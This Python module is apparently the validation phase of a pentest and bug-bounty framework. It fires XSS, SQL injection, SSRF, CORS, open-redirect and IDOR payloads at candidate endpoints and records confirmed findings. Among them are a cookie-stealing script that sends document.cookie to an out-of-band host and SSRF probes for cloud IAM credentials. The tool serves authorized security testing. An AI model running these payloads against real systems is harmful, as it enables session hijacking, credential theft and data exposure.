"""Phase 5: Full PoC validation — confirm candidates and create findings.

AUTHORIZATION GATE: Full PoC mode only activates when engagement.authorized: true
in scope.yaml (pentest mode). Bug bounty mode uses safe existence-proof only
to avoid violating program rules.
"""

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Optional

from oneinfinity.modules.utils import banner, section, ok, info, warn, err

# ── CVSS heuristics by vuln type ──────────────────────────────────────────────
VULN_CVSS = {
    "XSS":                       ("medium", 6.1),
    "SQLi":                      ("critical", 9.8),
    "SSRF":                      ("high", 8.6),
    "CORS":                      ("high", 8.1),
    "IDOR":                      ("high", 7.5),
    "Open Redirect":             ("medium", 6.1),
    "Secret Exposure":           ("high", 7.5),
    "Misconfiguration":          ("medium", 5.3),
    "Auth Bypass":               ("high", 8.8),
    "Missing Security Headers":  ("low", 3.1),
    "Information Disclosure":    ("low", 3.7),
}


@dataclass
class PoC:
    confirmed: bool
    vuln_type: str
    endpoint: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    request_snippet: str = ""
    response_snippet: str = ""
    impact: str = ""


class VulnValidator:
    def __init__(self, program_dir, db, session_id: int,
                 full_poc_mode: bool = False, oob_url: str = ""):
        """
        full_poc_mode: True only when pentest/authorized. Bug bounty uses safe proofs.
        """
        self.program_dir = program_dir
        self.db = db
        self.session_id = session_id
        self.full_poc_mode = full_poc_mode
        self.oob_url = oob_url

    def run(self, candidates, session_id: int) -> list[dict]:
        banner("Phase 5 — Vulnerability Validation")

        if self.full_poc_mode:
            warn("Full PoC mode ACTIVE (pentest engagement).")
            warn("Exploitation limited to scope targets only.")
        else:
            info("Bug bounty mode: safe existence-proof validation only.")

        validated_findings = []

        for cand in candidates:
            poc = self._dispatch(cand)
            if poc and poc.confirmed:
                fid = self._save_finding(cand, poc)
                self.db.confirm_candidate(cand.get("id", 0), fid)
                validated_findings.append({"candidate": cand, "poc": poc, "finding_id": fid})
                ok(f"CONFIRMED: {cand['vuln_type']} @ {cand['endpoint']} → Finding #{fid}")
            else:
                info(f"Not confirmed: {cand['vuln_type']} @ {cand.get('endpoint', '')}")

        self.db.update_session(session_id, phase_reached=5)
        ok(f"Phase 5 complete — {len(validated_findings)} validated findings")
        return validated_findings

    # ── Dispatcher ────────────────────────────────────────────────────────────

    def _dispatch(self, cand: dict) -> Optional[PoC]:
        vt = cand.get("vuln_type", "").upper()
        try:
            if vt == "XSS":
                return self.validate_xss(cand)
            elif vt in ("SQLI", "SQL INJECTION"):
                return self.validate_sqli(cand)
            elif vt == "SSRF":
                return self.validate_ssrf(cand)
            elif vt == "CORS":
                return self.validate_cors(cand)
            elif vt == "OPEN REDIRECT":
                return self.validate_redirect(cand)
            elif vt == "SECRET EXPOSURE":
                return self.validate_secret(cand)
            elif vt == "IDOR":
                return self.validate_idor(cand)
            elif vt == "MISCONFIGURATION":
                return self.validate_misconfig(cand)
            elif vt == "AUTH BYPASS":
                return self.validate_auth_bypass(cand)
            else:
                # Generic: existence proof
                return PoC(
                    confirmed=True,
                    vuln_type=cand["vuln_type"],
                    endpoint=cand.get("endpoint", ""),
                    evidence=cand.get("evidence", "Candidate found in Phase 4"),
                )
        except Exception as e:
            warn(f"Validation error for {cand.get('vuln_type')}: {e}")
            return None

    # ── XSS ──────────────────────────────────────────────────────────────────

    def validate_xss(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")
        param = cand.get("parameter", "")

        if self.full_poc_mode:
            # Full PoC: inject cookie-stealing payload (use OOB or alert domain)
            if self.oob_url:
                payload = (f"<script>fetch('{self.oob_url}?c='+document.cookie)</script>")
            else:
                payload = "<script>document.title=document.domain+'|'+document.cookie</script>"
        else:
            # Safe proof: inject alert(document.domain)
            payload = "<script>alert(document.domain)</script>"

        poc_url = self._inject_param(endpoint, param, payload)
        status, body, hdrs = self._fetch(poc_url)

        reflected = payload in body or payload.replace('"', "'") in body
        # Check if script tags are unescaped
        unescaped = "<script>" in body and payload[:20] in body

        return PoC(
            confirmed=reflected or unescaped,
            vuln_type="XSS",
            endpoint=endpoint,
            parameter=param,
            payload=payload,
            evidence=f"Payload reflected in response (HTTP {status})",
            request_snippet=f"GET {poc_url}",
            response_snippet=self._extract_context(body, payload[:20], chars=200),
            impact="Attacker can execute arbitrary JS in victim's browser, steal session cookies, perform actions as the victim.",
        )

    # ── SQLi ─────────────────────────────────────────────────────────────────

    def validate_sqli(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")
        param = cand.get("parameter", "")

        ERROR_PAYLOADS = ["'", '"', "' OR '1'='1", "1' AND 1=2--"]
        ERROR_PATTERNS = [
            r"sql syntax", r"mysql_fetch", r"ORA-\d+", r"PostgreSQL.*ERROR",
            r"microsoft.*database.*engine", r"SQLSTATE", r"syntax error.*sql",
            r"unclosed quotation", r"Warning: mysql",
        ]

        for payload in ERROR_PAYLOADS:
            url = self._inject_param(endpoint, param, payload)
            status, body, hdrs = self._fetch(url)
            for pat in ERROR_PATTERNS:
                if re.search(pat, body, re.IGNORECASE):
                    evidence = f"SQL error pattern '{pat}' found in response"
                    if self.full_poc_mode:
                        # Try to extract version
                        ver_url = self._inject_param(
                            endpoint, param,
                            "1 UNION SELECT @@version,NULL,NULL--"
                        )
                        _, ver_body, _ = self._fetch(ver_url)
                        evidence += f"\nExtraction attempt — response: {ver_body[:200]}"

                    return PoC(
                        confirmed=True,
                        vuln_type="SQLi",
                        endpoint=endpoint,
                        parameter=param,
                        payload=payload,
                        evidence=evidence,
                        request_snippet=f"GET {url}",
                        response_snippet=self._extract_context(body, "sql", chars=300),
                        impact="SQL injection allows database enumeration, authentication bypass, or data exfiltration.",
                    )

        # Time-based
        time_payload = "1' AND SLEEP(5)--"
        url = self._inject_param(endpoint, param, time_payload)
        t0 = time.time()
        self._fetch(url)
        elapsed = time.time() - t0
        if elapsed >= 4.5:
            return PoC(
                confirmed=True,
                vuln_type="SQLi (time-based)",
                endpoint=endpoint,
                parameter=param,
                payload=time_payload,
                evidence=f"Response delayed {elapsed:.1f}s with SLEEP(5) payload",
                impact="Blind SQL injection — may allow data extraction via time-based technique.",
            )

        return PoC(confirmed=False, vuln_type="SQLi", endpoint=endpoint)

    # ── SSRF ─────────────────────────────────────────────────────────────────

    def validate_ssrf(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")
        param = cand.get("parameter", "")

        if self.full_poc_mode:
            # Probe cloud metadata for IAM creds
            targets = [
                ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM"),
                ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
                ("http://169.254.169.254/metadata/v1/", "Azure metadata"),
            ]
        else:
            targets = [
                ("http://127.0.0.1/", "localhost"),
                ("http://localhost:22/", "local SSH"),
            ]

        for ssrf_url, label in targets:
            url = self._inject_param(endpoint, param, ssrf_url)
            _, body, _ = self._fetch(url)
            if body and len(body) > 10:
                return PoC(
                    confirmed=True,
                    vuln_type="SSRF",
                    endpoint=endpoint,
                    parameter=param,
                    payload=ssrf_url,
                    evidence=f"Response received from {label} ({len(body)} bytes)",
                    response_snippet=body[:300],
                    impact="SSRF allows accessing internal services or cloud metadata including IAM credentials.",
                )

        # OOB fallback
        if self.oob_url:
            oob = f"{self.oob_url.rstrip('/')}/ssrf-validate"
            url = self._inject_param(endpoint, param, oob)
            self._fetch(url)
            return PoC(
                confirmed=True,
                vuln_type="SSRF",
                endpoint=endpoint,
                parameter=param,
                payload=oob,
                evidence=f"OOB payload dispatched to {oob} — verify callback at OOB server",
                impact="SSRF confirmed via out-of-band callback.",
            )

        return PoC(confirmed=False, vuln_type="SSRF", endpoint=endpoint)

    # ── CORS ─────────────────────────────────────────────────────────────────

    def validate_cors(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")

        if self.full_poc_mode:
            # Full response body exfiltration demo
            _, body, hdrs = self._fetch(
                endpoint,
                headers={"Origin": "https://evil.com",
                         "Cookie": "test=poc"},
            )
        else:
            _, body, hdrs = self._fetch(
                endpoint, headers={"Origin": "https://evil.com"}
            )

        acao = hdrs.get("access-control-allow-origin", hdrs.get("Access-Control-Allow-Origin", ""))
        acac = hdrs.get("access-control-allow-credentials", hdrs.get("Access-Control-Allow-Credentials", ""))

        if "evil.com" in acao:
            return PoC(
                confirmed=True,
                vuln_type="CORS",
                endpoint=endpoint,
                payload="Origin: https://evil.com",
                evidence=f"ACAO: {acao} | ACAC: {acac}",
                response_snippet=body[:300] if self.full_poc_mode else f"ACAO header: {acao}",
                impact="Attacker can read authenticated responses from the victim's browser via cross-origin requests.",
            )
        return PoC(confirmed=False, vuln_type="CORS", endpoint=endpoint)

    # ── Open Redirect ─────────────────────────────────────────────────────────

    def validate_redirect(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")
        param = cand.get("parameter", "")
        payload = "https://evil.com"

        url = self._inject_param(endpoint, param, payload)
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                location = resp.geturl()
        except urllib.error.HTTPError as e:
            location = e.headers.get("Location", "")
        except Exception:
            location = ""

        if "evil.com" in location:
            return PoC(
                confirmed=True,
                vuln_type="Open Redirect",
                endpoint=endpoint,
                parameter=param,
                payload=payload,
                evidence=f"Final URL after redirect: {location}",
                impact="Attacker can redirect users to phishing pages, used in phishing and OAuth flows.",
            )
        return PoC(confirmed=False, vuln_type="Open Redirect", endpoint=endpoint)

    # ── Secret ────────────────────────────────────────────────────────────────

    def validate_secret(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")
        evidence = cand.get("evidence", "")

        # Extract the actual key value from evidence
        key_match = re.search(r"found: (.+)$", evidence)
        key_snippet = key_match.group(1).strip() if key_match else ""

        return PoC(
            confirmed=True,
            vuln_type="Secret Exposure",
            endpoint=endpoint,
            evidence=evidence,
            payload=key_snippet,
            impact="Exposed credentials allow direct API access, lateral movement, or account takeover.",
        )

    # ── IDOR ─────────────────────────────────────────────────────────────────

    def validate_idor(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")
        param = cand.get("parameter", "")
        evidence = cand.get("evidence", "")

        # Re-fetch both IDs and compare top-level JSON keys
        parsed = urllib.parse.urlparse(endpoint)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        base_val = qs.get(param, "1")

        if not base_val.isdigit():
            return PoC(confirmed=False, vuln_type="IDOR", endpoint=endpoint)

        _, body1, _ = self._fetch(endpoint)
        test_id = str(int(base_val) + 1)
        url2 = self._inject_param(endpoint, param, test_id)
        _, body2, _ = self._fetch(url2)

        if body1 != body2 and body2 and body1:
            # Try to extract field names to show real data access
            fields = []
            try:
                d2 = json.loads(body2)
                if isinstance(d2, dict):
                    fields = list(d2.keys())[:10]
            except Exception:
                pass
            return PoC(
                confirmed=True,
                vuln_type="IDOR",
                endpoint=endpoint,
                parameter=param,
                payload=f"{param}={test_id} (original={base_val})",
                evidence=evidence + (f"\nResponse fields: {', '.join(fields)}" if fields else ""),
                response_snippet=body2[:300],
                impact="Attacker can access or modify other users' data without authorization.",
            )
        return PoC(confirmed=False, vuln_type="IDOR", endpoint=endpoint)

    # ── Misconfiguration ──────────────────────────────────────────────────────

    def validate_misconfig(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")
        status, body, hdrs = self._fetch(endpoint)

        if status == 200 and body:
            return PoC(
                confirmed=True,
                vuln_type="Misconfiguration",
                endpoint=endpoint,
                evidence=f"Path accessible — {len(body)} bytes (HTTP {status})",
                response_snippet=body[:400],
                impact="Exposed configuration files may reveal secrets, credentials, or internal structure.",
            )
        return PoC(confirmed=False, vuln_type="Misconfiguration", endpoint=endpoint)

    # ── Auth bypass ───────────────────────────────────────────────────────────

    def validate_auth_bypass(self, cand: dict) -> PoC:
        endpoint = cand.get("endpoint", "")

        # Check access with no auth
        status, body, hdrs = self._fetch(endpoint)
        if status == 200 and body:
            # Check for actual data (JSON with fields)
            has_data = False
            try:
                d = json.loads(body)
                has_data = bool(d)
            except Exception:
                has_data = len(body) > 100

            if has_data:
                return PoC(
                    confirmed=True,
                    vuln_type="Auth Bypass",
                    endpoint=endpoint,
                    evidence=f"Endpoint returns HTTP 200 with data ({len(body)} bytes) without auth",
                    response_snippet=body[:300],
                    impact="Protected endpoint accessible without authentication, exposing user data.",
                )
        return PoC(confirmed=False, vuln_type="Auth Bypass", endpoint=endpoint)

    # ── Save finding ──────────────────────────────────────────────────────────

    def _save_finding(self, cand: dict, poc: PoC) -> int:
        sev, cvss = VULN_CVSS.get(cand.get("vuln_type", ""), ("medium", 5.0))
        steps = (
            f"1. Navigate to: {poc.endpoint}\n"
            f"2. {'Set parameter ' + poc.parameter + ' to: ' if poc.parameter else 'Send request: '}"
            f"{poc.payload}\n"
            f"3. Observe: {poc.evidence}"
        )
        poc_text = (
            f"Request: {poc.request_snippet or poc.endpoint}\n"
            f"Payload: {poc.payload}\n"
            f"Response snippet:\n{poc.response_snippet}"
        )
        fid = self.db.add(
            title=f"{cand['vuln_type']} in {_short_path(poc.endpoint)}",
            vuln_type=cand["vuln_type"],
            severity=sev,
            cvss_score=cvss,
            endpoint=poc.endpoint,
            method=cand.get("method", "GET"),
            parameter=cand.get("parameter") or None,
            description=poc.evidence,
            steps_to_reproduce=steps,
            impact=poc.impact,
            poc=poc_text,
            status="verified",
            notes=f"Auto-validated by framework Phase 5. Session: {self.session_id}",
        )
        return fid

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, value: str) -> str:
        if not param:
            return url
        parsed = urllib.parse.urlparse(url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = value
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))

    def _fetch(self, url: str, headers: dict = None, timeout: int = 10) -> tuple[int, str, dict]:
        h = {"User-Agent": "Mozilla/5.0 (OneInfinity/1.0)"}
        if headers:
            h.update(headers)
        try:
            req = urllib.request.Request(url, headers=h)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(100000).decode("utf-8", errors="replace")
                return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as e:
            body = e.read(10000).decode("utf-8", errors="replace")
            return e.code, body, dict(e.headers)
        except Exception:
            return 0, "", {}

    @staticmethod
    def _extract_context(body: str, needle: str, chars: int = 200) -> str:
        idx = body.lower().find(needle.lower())
        if idx == -1:
            return body[:chars]
        start = max(0, idx - 50)
        return body[start: start + chars]


def _short_path(url: str) -> str:
    try:
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc + parsed.path[:40]
    except Exception:
        return url[:60]
